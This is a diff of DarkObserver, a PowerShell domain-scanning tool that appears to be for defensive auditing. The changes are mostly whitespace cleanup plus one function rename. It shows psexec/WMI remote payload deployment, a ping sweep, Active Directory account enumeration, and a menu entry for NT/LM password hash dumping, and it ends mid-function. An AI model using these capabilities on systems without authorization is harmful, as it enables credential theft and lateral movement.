@@ -2,92 +2,92 @@
 
 ############################################
 #		START Menu Functions
-############################################ 
+############################################
 
 Function AsciiArt
 {
 	switch($(Get-Random(6)))
 	{
 		0{ Write-Host @'
-		
-		
-                    ______               __        _______ __                                      
+
+
+                    ______               __        _______ __
                    |   _  \ .---.-.----.|  |--.   |   _   |  |--.-----.-----.----.--.--.-----.----.
                    |.  |   \|  _  |   _||    <    |.  |   |  _  |__ --|  -__|   _|  |  |  -__|   _|
-                   |.  |    \___._|__|  |__|__|   |.  |   |_____|_____|_____|__|  \___/|_____|__|  
-                   |:  1    /                     |:  1   |                                        
-                   |::.. . /                      |::.. . |                                        
-                   `------'                       `-------'                                       
+                   |.  |    \___._|__|  |__|__|   |.  |   |_____|_____|_____|__|  \___/|_____|__|
+                   |:  1    /                     |:  1   |
+                   |::.. . /                      |::.. . |
+                   `------'                       `-------'
 
-				   
+
 '@}
         1{Write-Host @'
-		
-		
-                     _         ()_()      _         .-.     ___   oo_    wWw()_()wWw    wWwwWw()_()  
-                   /||_   /)  (O o|OO) .' )      c(O_O)c  (___)_/  _)-< (O)(O o)(O)    (O)(O)(O o)  
-                    /o_)(o)(O) |^_\||_/ .'      ,'.---.`, (O)(O)\__ `.  / __)^_\( \    / )/ __)^_\  
-                   / |(\ //\\  |(_))   /       / /|_|_|\ \/  _\    `. |/ (  |(_))\ \  / // (  |(_)) 
-                   | | ))(__)| |  /||\ \       | \_____/ || |_))   _| (  _) |  / /  \/  (  _) |  /  
-                   | |///,-. | )|\(/\)\ `.     '. `---' .`| |_)),-'   |\ \_ )|\\ \ `--' /\ \_ )|\\  
+
+
+                     _         ()_()      _         .-.     ___   oo_    wWw()_()wWw    wWwwWw()_()
+                   /||_   /)  (O o|OO) .' )      c(O_O)c  (___)_/  _)-< (O)(O o)(O)    (O)(O)(O o)
+                    /o_)(o)(O) |^_\||_/ .'      ,'.---.`, (O)(O)\__ `.  / __)^_\( \    / )/ __)^_\
+                   / |(\ //\\  |(_))   /       / /|_|_|\ \/  _\    `. |/ (  |(_))\ \  / // (  |(_))
+                   | | ))(__)| |  /||\ \       | \_____/ || |_))   _| (  _) |  / /  \/  (  _) |  /
+                   | |///,-. | )|\(/\)\ `.     '. `---' .`| |_)),-'   |\ \_ )|\\ \ `--' /\ \_ )|\\
                    \__/-'   ''(/  \)   `._)      `-...-'  (.'-'(_..--'  \__|/  \) `-..-'  \__|/  \)
-  
-  
+
+
 '@}
 		2{Write-Host @'
-  
-  
-             _____                              _____                                                     
-           __|__   |__ ____   _____  __  __   __|__   |__ ______ ______ ______ _____ __    _______ _____   
-          |     \     |    \ |     ||  |/ /  /     \     |      >   ___|   ___|     \  \  //   ___|     |  
-          |      \    |     \|     \|     \  |     |     |     < `-.`-.|   ___|     \\  \//|   ___|     \  
-          |______/  __|__|\__\__|\__\__|\__\ \_____/   __|______>______|______|__|\__\\__/ |______|__|\__\ 
-             |_____|                            |_____|                                                    
-  
-  
+
+
+             _____                              _____
+           __|__   |__ ____   _____  __  __   __|__   |__ ______ ______ ______ _____ __    _______ _____
+          |     \     |    \ |     ||  |/ /  /     \     |      >   ___|   ___|     \  \  //   ___|     |
+          |      \    |     \|     \|     \  |     |     |     < `-.`-.|   ___|     \\  \//|   ___|     \
+          |______/  __|__|\__\__|\__\__|\__\ \_____/   __|______>______|______|__|\__\\__/ |______|__|\__\
+             |_____|                            |_____|
+
+
 '@}
 		3{Write-Host @'
 
-		
-                \______ \ _____ _______|  | __ \_____  \\_ |__   ______ ______________  __ ___________ 
+
+                \______ \ _____ _______|  | __ \_____  \\_ |__   ______ ______________  __ ___________
                  |    |  \\__  \\_  __ \  |/ /  /   |   \| __ \ /  ___// __ \_  __ \  \/ // __ \_  __ \
                  |    `   \/ __ \|  | \/    <  /    |    \ \_\ \\___ \\  ___/|  | \/\   /\  ___/|  | \/
-                /_______  (____  /__|  |__|_ \ \_______  /___  /____  >\___  >__|    \_/  \___  >__|   
-                        \/     \/           \/         \/    \/     \/     \/                 \/     
+                /_______  (____  /__|  |__|_ \ \_______  /___  /____  >\___  >__|    \_/  \___  >__|
+                        \/     \/           \/         \/    \/     \/     \/                 \/
 
-		
+
 '@}
 		4{Write-Host @'
 
 
                                ___                    ___ _
-                              /   \__ _ _ __| | __   /___\ |__  ___  ___ _ ____   _____ _ __ 
+                              /   \__ _ _ __| | __   /___\ |__  ___  ___ _ ____   _____ _ __
                              / /\ / _` | '__| |/ /  //  // '_ \/ __|/ _ \ '__\ \ / / _ \ '__|
-                            / /_// (_| | |  |   <  / \_//| |_) \__ \  __/ |   \ V /  __/ |   
-                           /___,' \__,_|_|  |_|\_\ \___/ |_.__/|___/\___|_|    \_/ \___|_|  
+                            / /_// (_| | |  |   <  / \_//| |_) \__ \  __/ |   \ V /  __/ |
+                           /___,' \__,_|_|  |_|\_\ \___/ |_.__/|___/\___|_|    \_/ \___|_|
 
 
 '@}
 		5{Write-Host @'
 
-		
-                           ____,____,____, __, ,  ____, ____ ____,____,____,__  _,____,____, 
-                          (-|  (-/_|(-|__)( |_/  (-/  \(-|__|-(__(-|_,(-|__|-\  /(-|_,(-|__) 
-                           _|__//  |,_|  \,_| \,  _\__/,_|__)____)_|__,_|  \,_\/  _|__,_|  \,
-                          (   (     (     (      (     (    (    (    (     (    (    (      
 
-		
+                           ____,____,____, __, ,  ____, ____ ____,____,____,__  _,____,____,
+                          (-|  (-/_|(-|__)( |_/  (-/  \(-|__|-(__(-|_,(-|__|-\  /(-|_,(-|__)
+                           _|__//  |,_|  \,_| \,  _\__/,_|__)____)_|__,_|  \,_\/  _|__,_|  \,
+                          (   (     (     (      (     (    (    (    (     (    (    (
+
+
 '@}
  }
 }
 
 Function Resize #set console size
 {
-	if ($host.Name -eq 'ConsoleHost') 
+	if ($host.Name -eq 'ConsoleHost')
 	{
 		$Width = 120
 		$height = 45
-		
+
 		# buffer size can't be smaller than window size
 		if ($Width -gt $host.UI.RawUI.BufferSize.Width) {
 			$host.UI.RawUI.BufferSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($Width, $host.UI.RawUI.BufferSize.Height)
@@ -112,7 +112,7 @@ Function Resize #set console size
 Function ReadYellow
 {
 	[console]::ForegroundColor = "yellow"
-	$input = Read-Host 
+	$input = Read-Host
 	[console]::ForegroundColor = "white"
 	Return $input
 }
@@ -145,7 +145,7 @@ Function CreateTempDir
 Function CheckDependancies
 {
 	param($PSScriptRoot)
-	
+
 	#Check that user is a Domain Admin
 	try {
 		$admin=([ADSISEARCHER]"samaccountname=$($env:USERNAME)").Findone().Properties.memberof |
@@ -153,23 +153,23 @@ Function CheckDependancies
 	} Catch {}
 
     if($admin)
-    { 
+    {
         $Script:AdminPrivs = $true
     }
 	else {$Script:AdminPrivs = $false}
-	
+
 	#Add current directory to path
 	$env:path = $env:path+";.\"
-	
+
 	#Check for presence of psexec and store to a variable in $scan hash table
-    try { 
+    try {
 		if (test-path .\psexec.exe)
 		{
 			$script:scan.psexec = Get-Command ".\psexec.exe" -ErrorAction Stop
 			Return
 		}
 		elseif($script:scan.psexec = Get-Command "psexec.exe" -ErrorAction Stop){Return}
-		
+
     } Catch {  #psexec not in path. Check in script directory
 		if (test-path $PSScriptRoot\psexec.exe)
 		{
@@ -179,7 +179,7 @@ Function CheckDependancies
 		{
 			Write-Warning "Unable to find psexec.exe in your PATH.  Payloads will only attempt WMI for remote execution"
 			Return
-		}	
+		}
     }
 }
 
@@ -230,7 +230,7 @@ Which scan do you want to perform?
     [13] Antivirus Status
     [14] Local accounts
     [15] Domain accounts
-		
+
 Choice: " -NoNewLine
 	$ScanChoice = ReadYellow
 	Write-Host ""
@@ -244,7 +244,7 @@ Choice: " -NoNewLine
 			#If network shares permissions is chosen make sure that network shares data is present.
 			#If Network shares scan has not been run then run it before network shares permissions.
 			if(-not ((Get-ChildItem "$OUT_DIR\NetworkShares*.csv") -or (Get-ChildItem "$OUT_DIR\CSV\NetworkShares*.csv" -ErrorAction SilentlyContinue)))
-			{				
+			{
 				$ScanChoice = "11,12"
 			}
 		}
@@ -265,13 +265,13 @@ Function DisplayAdvancedMenu
 Which scan do you want to perform?
 
     [1]  File-Type Search
-    [2]  Logged on users 
-    [3]  Ping Sweep 
+    [2]  Logged on users
+    [3]  Ping Sweep
     [4]  Hot-Fix Enumeration
     [5]  NT/LM password hash dump (Win7+)
     [6]  File hasher (Win7+)
     [7]  Virus-Total hash analysis
-		
+
 Choice: " -NoNewLine
 		$AdvScanChoice = ReadYellow
 
@@ -296,7 +296,7 @@ Choice: " -NoNewLine
 				Return
 			}
 			7{if (-not (VTHashAnalysis)){Return}}
-			
+
 			"h"{Clear-Host; return $false}
 			"home"{Clear-Host; return $false}
 			"x"{ExitFunction}
@@ -309,27 +309,27 @@ Choice: " -NoNewLine
 Function ParseMenuChoice
 {
 	param($Choice, $TotalChoices)
-	
+
 	#Create a temporary array to store the different comma separated scan choices
 	$TempChoiceArray = New-Object System.Collections.ArrayList
 	$Choice = $Choice.split(",") | %{$_.trim()}
-	
+
 	#if the array only has 1 item do this
 	if(-not $Choice.count -or $Choice.count -eq 1)
 	{
 		$TempChoiceArray.Add($Choice)|out-null
-		
-		#choice of 0 means perform all scans.  
+
+		#choice of 0 means perform all scans.
 		if($TempChoiceArray[0] -eq "0")
 		{
 			$TempChoiceArray.Clear()
-			
+
 			#Fill array with values from 1 to total number of choices
 			for($i=1; $i -le $TotalChoices; $i++){$TempChoiceArray.Add($i)|out-null}
 			Return $TempChoiceArray
 		}
-	}	
-	
+	}
+
 	else
 	{
 		#add each comma separated item to the array
@@ -370,7 +370,7 @@ Function ParseMenuChoice
 				}
 				#remove the item that represents the range from the temp array
 				$TempChoiceArray.Remove($TempChoiceArray[$i])|out-null
-				
+
 				#restart the loop until all choice ranges have been expanded
 				$i = -1
 			}
@@ -380,13 +380,13 @@ Function ParseMenuChoice
 			}
 		}
 	}
-	
+
 	for($i=0; $i -lt $TempChoiceArray.count; $i++)
 	{
 		if($TempChoiceArray[$i] -match "[0-9]" -and $TempChoiceArray[$i] -notmatch "[a-zA-Z]")
 		{
 			#convert to base 10 integer
-			$TempChoiceArray[$i] = [convert]::ToInt32($TempChoiceArray[$i], 10) 		
+			$TempChoiceArray[$i] = [convert]::ToInt32($TempChoiceArray[$i], 10)
 		}
 		else
 		{
@@ -395,7 +395,7 @@ Function ParseMenuChoice
 			$TempChoiceArray.Remove($TempChoiceArray[$i])
 		}
 	}
-	
+
 	#return sorted array
 	$TempChoiceArray = $TempChoiceArray | sort
 	Return $TempChoiceArray
@@ -412,11 +412,11 @@ Function SetOutFile
 		if($CurrentChoice -eq $(Get-Location).path)
 		{
 			$(Get-Location).path+"\Scans${today}"
-			$(Get-Location).path+"\Scans${today}_TEMP" 
+			$(Get-Location).path+"\Scans${today}_TEMP"
 			$script:OUT_DIR_root = $CurrentChoice
 			return
 		}
-		
+
 		#User changed default choice.  Make sure choice is full path
 		else
 		{
@@ -469,7 +469,7 @@ Function SetKnownGood
 		$null|Add-Content "$PSScriptRoot\KnownGood\InstalledSoftware.txt"
 		$null|Add-Content "$PSScriptRoot\KnownGood\RequiredHotFix.txt"
 	}
-	
+
 	#Directory is present.  Make sure each data parsing file exists
 	if (-not (Test-Path "$PSScriptRoot\KnownGood\UserExeSearch.txt")){
 		$null|Add-Content "$PSScriptRoot\KnownGood\UserExeSearch.txt"
@@ -524,7 +524,7 @@ Available Options:
   home[h].......Return to prompt
   exit[x].......Return to powershell
 "
-  
+
 }
 
 #set the hosts that should be scanned
@@ -535,20 +535,20 @@ Function ScanHostsFile
 	if(-not $input){$input = $CurrentChoice} #keep current value
 
 	#generate list of all active hosts in domain
-	if($input -eq "ALL") 
+	if($input -eq "ALL")
 	{
 		if($script:ScanDomain -eq $null)
 		{
 			Write-Warning "Host-File is required for deployable scans when domain is null"
 			Return $input
 		}
-		else 
+		else
 		{
 			$script:FirstRunComps = $True
-			Return $input 
+			Return $input
 		}
 	}
-	
+
 	#User input is not valid.  Either does not exist or is not a file
 	elseif(-not (Test-Path $input -PathType Leaf))
 	{
@@ -559,9 +559,9 @@ Function ScanHostsFile
 		Else
 		{
 			Write-Host -ForegroundColor Red "  $input not found"
-		}		
+		}
 	}
-	
+
 	#User input is valid.  Return user input
 	else
 	{
@@ -592,7 +592,7 @@ Function OutputFormat
 				Write-Host -ForegroundColor Red "  Choices are: csv, xls, xlsx, xlsb"; return $false
 			}
 		}
-	}	
+	}
 }
 
 Function ThreadCount
@@ -600,12 +600,12 @@ Function ThreadCount
 	param($CurrentChoice)
 	$ProcNum = (gwmi win32_computersystem).NumberofLogicalProcessors #number of processor cores
 	$min=1 #minimum number of threads is 1
-	$max=$ProcNum*2 
+	$max=$ProcNum*2
 	if($max -lt 8){$max = 8} #maximum number of threads is twice the number of processor cores or 8, whichever is more.
 	$input = ReadYellow
 	if(-not $input){[convert]::ToInt32($CurrentChoice); return}
 	try{
-		$input = [convert]::ToInt32($input) 
+		$input = [convert]::ToInt32($input)
 		if($input -ge $min -and $input -le $max){$input; return}
 		else {Write-Host -ForegroundColor Red "  Choose a number from $min to $max"; return $false}
 	} catch {
@@ -632,7 +632,7 @@ Function SetScanDomain
 			Return
 		}
 		$script:DistinguishedName = "DC=$($CurrentChoice.Replace('.',',DC='))" #convert fqdn into distinguished name
-		Return $CurrentChoice		
+		Return $CurrentChoice
 	}
 
 	if ($input.split('.').count -eq 1) #input is not an fqdn
@@ -654,7 +654,7 @@ Function SetScanDomain
 	{
 		$fqdn = $input
 	}
-	
+
 	$script:DistinguishedName = "DC=$($fqdn.Replace('.',',DC='))"
 
 	try {
@@ -666,13 +666,13 @@ Function SetScanDomain
 			Write-Host -ForegroundColor Red  "  Domain cannot be reached: $fqdn"
 			Return $False
 		}
-	} 
+	}
 }
 
 Function Config #prompt user for required scan variables
 {
-	Write-Host 
-	
+	Write-Host
+
 	#Set default values if variables are not already set
 	if(-not $ScanHostsFile){$ScanHostsFile="ALL"}
 	if(-not $OUT_DIR_root){$OUT_DIR_root=$(Get-Location).path}
@@ -694,9 +694,9 @@ Function Config #prompt user for required scan variables
 		{
 			$UserDomain = $env:USERDOMAIN
 		}
-		
+
 	}
-	
+
 	while($true) #loop until input is valid
 	{
 		Write-Host "  Domain [$ScanDomain]: " -NoNewLine #set out file
@@ -794,8 +794,8 @@ Function Set-Creds #Get different credential than logged on user.  This Function
 }
 
 Function CurrentConfig #display currently set scan variables
-{	
-	if(-not $scan.creds) 
+{
+	if(-not $scan.creds)
 	{
 		if($env:USERDOMAIN -eq $env:COMPUTERNAME)
 		{
@@ -807,20 +807,20 @@ Function CurrentConfig #display currently set scan variables
 		}
 		$uname = $env:USERNAME
 	}
-	else 
+	else
 	{
 		$dname = $scan.creds.GetNetworkCredential().domain
 		$uname = $scan.creds.GetNetworkCredential().username
 	}
 	if(-not $script:ScanDomain) {$script:ScanDomain=$env:USERDNSDOMAIN}
-	Write-Host 
+	Write-Host
 	Write-Host "            Domain: $ScanDomain"
-	Write-Host "    Data directory: $OUT_DIR_root" 
-	Write-Host "     Hosts to scan: $ScanHostsFile" 
-	Write-Host "     Output format: $OutputFormat" 
+	Write-Host "    Data directory: $OUT_DIR_root"
+	Write-Host "     Hosts to scan: $ScanHostsFile"
+	Write-Host "     Output format: $OutputFormat"
 	Write-Host "      Thread count: $ThreadCount"
 	Write-Host "  User Credentials: $dname\$uname
-	" 
+	"
 }
 
 Function DarkObserver #darkobserver command prompt
@@ -838,10 +838,10 @@ Function DarkObserver #darkobserver command prompt
 		"set-creds"{Set-Creds}
 		"get-hosts"{
 			if (-not $script:ConfigSuccess){$script:ConfigSuccess = config} #scan vars have not been configured enter configuration mode
-			if(-not $script:ConfigSuccess){Return}	
+			if(-not $script:ConfigSuccess){Return}
 			CreateTempDir
 			$Script:ScanTime = $((get-date).tostring("HHmmss"))
-			Write-Host	
+			Write-Host
 			$script:ActiveComputers = @(GetActiveComputers $TRUE)
 		}
 		"cls"{Clear-Host}
@@ -878,19 +878,19 @@ Function ReturnFunction
 
 ############################################
 #		END Menu Functions
-############################################ 
+############################################
 
 
 ############################################
 #		START Scan Functions
-############################################ 
+############################################
 
 #Set all variables to to used for each scan
-Function SetScanTypeVars 
+Function SetScanTypeVars
 {
 	param($Selection) #scan choice
 	(get-Date).ToString()
-	switch ($Selection) 
+	switch ($Selection)
     {
         1{
 			$Script:Deploy = $true #means this is will copy over a script to be executed with psexec
@@ -956,7 +956,7 @@ Function SetScanTypeVars
 			$Script:scan.TimeOut = 120
 			$Script:scan.PS1Code = $QueryServicesCode_PS1
 			$Script:scan.BATCode = $QueryServicesCode_BAT}
-			
+
         9{
 			$Script:Deploy = $true
             $Script:ScanType="network connections query"
@@ -972,7 +972,7 @@ Function SetScanTypeVars
 			$Script:scan.RemoteDataFile = "InstalledSoftware392125281"
 			$Script:scan.TimeOut = 240
 			$Script:scan.PS1Code = $InstalledSoftwareCode_PS1
-			$Script:scan.BATCode = $InstalledSoftwareCode_BAT}  
+			$Script:scan.BATCode = $InstalledSoftwareCode_BAT}
         11{
 			$Script:Deploy = $true
             $Script:ScanType="network shares query"
@@ -983,8 +983,8 @@ Function SetScanTypeVars
 			$Script:scan.BATCode = $SharesCode_BAT}
         12{
 			$Script:Deploy = $false
-			$Script:outfile="NetworkSharesPermissions$script:ScanTime.csv"
-			NetworkSharesPermissions}
+			$Script:outfile="NetworkSharePermissions$script:ScanTime.csv"
+			NetworkSharePermissions}
         13{
             #!!!!!!!This check does not work on servers.  Check servers manually!!!!!!
 			$Script:Deploy = $true
@@ -993,7 +993,7 @@ Function SetScanTypeVars
 			$Script:scan.RemoteDataFile = "AntivirusStatus392125281"
 			$Script:scan.TimeOut = 120
 			$Script:scan.PS1Code = $AntivirusStatusCode_PS1
-			$Script:scan.BATCode = $AntivirusStatusCode_BAT}   
+			$Script:scan.BATCode = $AntivirusStatusCode_BAT}
 		14{
 			$Script:Deploy = $true
             $Script:ScanType="local account enumeration"
@@ -1023,8 +1023,8 @@ Function SetScanTypeVars
 			$Script:scan.RemoteDataFile = "HotFixData392125281"
 			$Script:scan.TimeOut = 240
 			$Script:scan.PS1Code = $HotFixCode_PS1
-			$Script:scan.BATCode = $HotFixCode_BAT} 
-		
+			$Script:scan.BATCode = $HotFixCode_BAT}
+
 		101{
 			$Script:Deploy = $true
             $Script:ScanType="image file search"
@@ -1095,13 +1095,13 @@ Function SetScanTypeVars
 			$Script:scan.RemoteDataFile = "hashes392125281"
 			$Script:scan.TimeOut = 2700
 			$Script:scan.PS1Code = $FileHasher}
-		
-		
+
+
 		"h"{return}
 		"home"{return}
 		"x"{ExitFunction}
 		"exit"{ExitFunction}
-		
+
         default{
             Write-Host -ForegroundColor Red "    Invalid Choice: $Selection
             "
@@ -1115,13 +1115,13 @@ Function SetScanTypeVars
 Function GetResults
 {
 	param($results)
-	
+
     Foreach($result in $results)
     {
-		if($result.properties.item("lastLogon") -ne 0) 
-		{ 
-			$LastLogon = [datetime]::FromFileTime([int64]::Parse($result.properties.item("lastLogon")))    
-		} 
+		if($result.properties.item("lastLogon") -ne 0)
+		{
+			$LastLogon = [datetime]::FromFileTime([int64]::Parse($result.properties.item("lastLogon")))
+		}
 		else
 		{
 			$LastLogon = $null
@@ -1142,7 +1142,7 @@ Function GetResults
 		elseif($UAC -band 0x0002){$status = 'Disabled'}
 		else{$status = 'Active'}
 		$Account = $($result.properties.item("SAMAccountName"))
-		"$Account,$status,$LastLogon,$MemberOf" 
+		"$Account,$status,$LastLogon,$MemberOf"
 		$MemberOf = $null
     }
 }
@@ -1151,7 +1151,7 @@ Function GetResults
 Function ConvertDate
 {
 	param($Day)
-	
+
     #Convert to datetime.
     $Date = [DateTime]"$Day"
 
@@ -1171,13 +1171,13 @@ Function ConvertDate
 Function DomainAccounts
 {
 	Write-Host -ForegroundColor Yellow "Collecting active directory user account data."
-	
-    #Variables to hold dates (30 & 45 days ago) 
+
+    #Variables to hold dates (30 & 45 days ago)
     $30Days = (get-date).adddays(-30)
     $45Days = (get-date).adddays(-45)
 
     #Create a new object to search Active directory
-    #[ADSI]"" searches begining in the the root of your current domain 
+    #[ADSI]"" searches begining in the the root of your current domain
     #you can change where your search starts by specifying the AD location
     #example: [ADSI]"LDAP://OU=Users and Computers,DC=foo,DC=bar,DC=com"
     $Search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
@@ -1196,14 +1196,14 @@ Function DomainAccounts
 
     #Accounts not accessed in 45 days
     $Value = ConvertDate($45Days)
-	
+
     #UTC date for whencreated comparison
     $Value2 = $45Days.ToString("yyhhmmss.0Z")
 
     $Search.filter = "(|(&(objectCategory=person)(objectClass=user)(lastLogon<=$Value)(!(lastLogon=0)))(&(objectCategory=person)(objectClass=user)(whenCreated<=$Value2)(|(!(lastLogon=*))(lastLogon=0))))"
 	"Account Name,Status,Last Logon,Group Membership"|Add-content "$TEMP_DIR\45DaysStale.csv"
 	GetResults $Search.Findall() | sort | Add-content "$TEMP_DIR\45DaysStale.csv"
-	
+
 	$Convert = "$TEMP_DIR\NoCLO.csv", "$TEMP_DIR\45DaysStale.csv", "$TEMP_DIR\30DaysStale.csv"
 	ConvertFileFormat $Convert
 }
@@ -1212,10 +1212,10 @@ Function DomainAccounts
 Function GetComputers
 {
     #Create a new object to search Active directory
-    #[ADSI]“" searches beginning in the the root of your current domain 
+    #[ADSI]“" searches beginning in the the root of your current domain
     #you can change where your search starts by specifying the AD location
     #example: [ADSI]“LDAP://OU=Users and Computers,DC=foo,DC=bar,DC=com”
-	
+
 	param($HostFile)
 
 	if(-not ($HostFile -eq "ALL")) #host names to scan provided by user
@@ -1243,7 +1243,7 @@ Function GetComputers
 Function GetActiveComputers
 {
 	param($menuScan)
-	
+
 	(get-Date).ToString() | Write-Host
 	Write-Host -ForegroundColor Yellow "Generating list of active computers"
 	$ScannedHosts = "Scanned_Hosts$script:ScanTime.csv"
@@ -1252,13 +1252,13 @@ Function GetActiveComputers
 	if($scan.Throttle -gt 50){$scan.Throttle = 50}
 	$scan.DomainName = $DistinguishedName
 	[string[]] $Computers = GetComputers $ScanHostsFile
-	"Time Stamp,Host Name, Error" | Add-Content "$TEMP_DIR\ErrorLog.csv" 
+	"Time Stamp,Host Name, Error" | Add-Content "$TEMP_DIR\ErrorLog.csv"
 	[string[]] $ActiveComputers = RunScriptBlock $ActiveComputers_SB $Computers $scan
 	$scan.Throttle = $Threads #re-set throttle
 
 	$ActiveComputers = $ActiveComputers | Sort -Unique | Select-String -NotMatch $env:COMPUTERNAME #remove scanning machine and any duplicates
 	$numActOrig = $ActiveComputers.count #number of active computers returned
-	
+
 	#Write list of computers to file starting with column names
 	"Host Name,IP Address,Operating System,Version"|Add-Content "$TEMP_DIR\$ScannedHosts"
 	$ActiveComputers |Add-Content "$TEMP_DIR\$ScannedHosts"
@@ -1270,11 +1270,11 @@ Function GetActiveComputers
 	}
 	Else
 	{
-		ConvertFileFormat $ConvertFiles $true 
+		ConvertFileFormat $ConvertFiles $true
 	}
-	
+
 	#list of computers has been generated
-	$Script:FirstRunComps = $false 
+	$Script:FirstRunComps = $false
 	$numTot = $Computers.count
 	$numAct = $ActiveComputers.Count
 	if(-not ($numAct -ge 0)){$numAct = 0}
@@ -1283,17 +1283,17 @@ Function GetActiveComputers
 	Write-Host -ForegroundColor Yellow "$numAct/$numTot active computers found
 	"
 	#Store a timestamp for when list of computers was generated to update list after time
-	$script:CompsDate = Get-Date 
+	$script:CompsDate = Get-Date
 	return $ActiveComputers
 }
 
 Function VerifyIP
 {
 	param($IP, $CIDR)
-	
+
 	$Octets = $IP.split(".")
 	if($Octets.count -ne 4){Return $false}
-	
+
 	if($CIDR)
 	{
 		$CIDR = [convert]::ToInt32($CIDR, 10)
@@ -1301,8 +1301,8 @@ Function VerifyIP
 		{
 			Return $false
 		}
-	}	
-	
+	}
+
 	for($i=0; $i -lt 4; $i++)
 	{
 		if($Octets[$i] -match "[0-9]" -and $Octets[$i] -notmatch "[a-zA-Z]")
@@ -1321,113 +1321,113 @@ Function VerifyIP
 	Return $true
 }
 
-Function Get-IPSubnet 
-{ 
- 
-        Param( 
-        [Parameter(Mandatory = $true)] 
-        [Array] $Subnets 
-        ) 
- 
-	foreach($subnet in $Subnets){ 
- 
-		#Split IP and subnet 
-		$IP = ($Subnet -split "\/")[0] 
+Function Get-IPSubnet
+{
+
+        Param(
+        [Parameter(Mandatory = $true)]
+        [Array] $Subnets
+        )
+
+	foreach($subnet in $Subnets){
+
+		#Split IP and subnet
+		$IP = ($Subnet -split "\/")[0]
 		$CIDR = ($Subnet -split "\/")[1]
-		
+
 		if(-not (VerifyIP $IP $CIDR))
 		{
 			Write-Host -ForegroundColor Red "Invalid subnet: $subnet"
 			Return $false
 		}
 	}
-	
+
 	foreach($subnet in $Subnets)
 	{
 
-		#Split IP and subnet 
-		$IP = ($Subnet -split "\/")[0] 
-		
-        $SubnetBits = ($Subnet -split "\/")[1] 
-         
-        #Convert IP into binary 
-        #Split IP into different octects and for each one, figure out the binary with leading zeros and add to the total 
-        $Octets = $IP -split "\." 
-        $IPInBinary = @() 
-        foreach($Octet in $Octets) 
-            { 
-                #convert to binary 
-                $OctetInBinary = [convert]::ToString($Octet,2) 
-                 
-                #get length of binary string add leading zeros to make octet 
-                $OctetInBinary = ("0" * (8 - ($OctetInBinary).Length) + $OctetInBinary) 
- 
-                $IPInBinary = $IPInBinary + $OctetInBinary 
-            } 
-        $IPInBinary = $IPInBinary -join "" 
- 
-        #Get network ID by subtracting subnet mask 
-        $HostBits = 32-$SubnetBits 
-        $NetworkIDInBinary = $IPInBinary.Substring(0,$SubnetBits) 
-         
-        #Get host ID and get the first host ID by converting all 1s into 0s 
-        $HostIDInBinary = $IPInBinary.Substring($SubnetBits,$HostBits)         
-        $HostIDInBinary = $HostIDInBinary -replace "1","0" 
- 
-        #Work out all the host IDs in that subnet by cycling through $i from 1 up to max $HostIDInBinary (i.e. 1s stringed up to $HostBits) 
-        #Work out max $HostIDInBinary 
-        $imax = [convert]::ToInt32(("1" * $HostBits),2) -1 
- 
-        $IPs = @() 
- 
-        #Next ID is first network ID converted to decimal plus $i then converted to binary 
-        For ($i = 1 ; $i -le $imax ; $i++) 
-            { 
-                #Convert to decimal and add $i 
-                $NextHostIDInDecimal = ([convert]::ToInt32($HostIDInBinary,2) + $i) 
-                #Convert back to binary 
-                $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal,2) 
-                #Add leading zeros 
-                #Number of zeros to add  
-                $NoOfZerosToAdd = $HostIDInBinary.Length - $NextHostIDInBinary.Length 
-                $NextHostIDInBinary = ("0" * $NoOfZerosToAdd) + $NextHostIDInBinary 
- 
-                #Work out next IP 
-                #Add networkID to hostID 
-                $NextIPInBinary = $NetworkIDInBinary + $NextHostIDInBinary 
-                #Split into octets and separate by . then join 
-                $IP = @() 
-                For ($x = 1 ; $x -le 4 ; $x++) 
-                    { 
-                        #Work out start character position 
-                        $StartCharNumber = ($x-1)*8 
-                        #Get octet in binary 
-                        $IPOctetInBinary = $NextIPInBinary.Substring($StartCharNumber,8) 
-                        #Convert octet into decimal 
-                        $IPOctetInDecimal = [convert]::ToInt32($IPOctetInBinary,2) 
-                        #Add octet to IP  
-                        $IP += $IPOctetInDecimal 
-                    } 
- 
-                #Separate by . 
-                $IP = $IP -join "." 
-                $IPs += $IP 
-            } 
-        $IPs 
-    } 
+		#Split IP and subnet
+		$IP = ($Subnet -split "\/")[0]
+
+        $SubnetBits = ($Subnet -split "\/")[1]
+
+        #Convert IP into binary
+        #Split IP into different octects and for each one, figure out the binary with leading zeros and add to the total
+        $Octets = $IP -split "\."
+        $IPInBinary = @()
+        foreach($Octet in $Octets)
+            {
+                #convert to binary
+                $OctetInBinary = [convert]::ToString($Octet,2)
+
+                #get length of binary string add leading zeros to make octet
+                $OctetInBinary = ("0" * (8 - ($OctetInBinary).Length) + $OctetInBinary)
+
+                $IPInBinary = $IPInBinary + $OctetInBinary
+            }
+        $IPInBinary = $IPInBinary -join ""
+
+        #Get network ID by subtracting subnet mask
+        $HostBits = 32-$SubnetBits
+        $NetworkIDInBinary = $IPInBinary.Substring(0,$SubnetBits)
+
+        #Get host ID and get the first host ID by converting all 1s into 0s
+        $HostIDInBinary = $IPInBinary.Substring($SubnetBits,$HostBits)
+        $HostIDInBinary = $HostIDInBinary -replace "1","0"
+
+        #Work out all the host IDs in that subnet by cycling through $i from 1 up to max $HostIDInBinary (i.e. 1s stringed up to $HostBits)
+        #Work out max $HostIDInBinary
+        $imax = [convert]::ToInt32(("1" * $HostBits),2) -1
+
+        $IPs = @()
+
+        #Next ID is first network ID converted to decimal plus $i then converted to binary
+        For ($i = 1 ; $i -le $imax ; $i++)
+            {
+                #Convert to decimal and add $i
+                $NextHostIDInDecimal = ([convert]::ToInt32($HostIDInBinary,2) + $i)
+                #Convert back to binary
+                $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal,2)
+                #Add leading zeros
+                #Number of zeros to add
+                $NoOfZerosToAdd = $HostIDInBinary.Length - $NextHostIDInBinary.Length
+                $NextHostIDInBinary = ("0" * $NoOfZerosToAdd) + $NextHostIDInBinary
+
+                #Work out next IP
+                #Add networkID to hostID
+                $NextIPInBinary = $NetworkIDInBinary + $NextHostIDInBinary
+                #Split into octets and separate by . then join
+                $IP = @()
+                For ($x = 1 ; $x -le 4 ; $x++)
+                    {
+                        #Work out start character position
+                        $StartCharNumber = ($x-1)*8
+                        #Get octet in binary
+                        $IPOctetInBinary = $NextIPInBinary.Substring($StartCharNumber,8)
+                        #Convert octet into decimal
+                        $IPOctetInDecimal = [convert]::ToInt32($IPOctetInBinary,2)
+                        #Add octet to IP
